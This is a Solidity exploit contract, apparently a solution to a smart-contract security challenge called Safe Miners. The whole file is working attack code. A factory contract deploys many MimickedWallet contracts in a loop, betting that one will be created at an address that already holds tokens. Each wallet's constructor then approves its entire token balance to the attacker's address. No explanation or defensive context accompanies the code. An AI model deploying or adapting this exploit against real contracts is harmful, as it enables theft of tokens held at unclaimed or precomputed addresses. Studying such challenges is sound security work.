pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract SafeMinersExploit {
    address[] walletAddresses;
    constructor(address _attacker, uint256 num, IERC20 token) {
        createWallets(_attacker, num, token);
    }

    function createWallets(address _attacker, uint256 _num, IERC20 token) internal {
        for (uint256 i = 0; i < _num; i++) {
            walletAddresses.push(address(new MimickedWallet(_attacker, token)));
        }
    }
    
    function getWalletAddreses() public view returns (address[] memory) {
        return walletAddresses;
    }
}

contract MimickedWallet {
    constructor(address _attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.approve(_attacker, balance);
        }
    }
}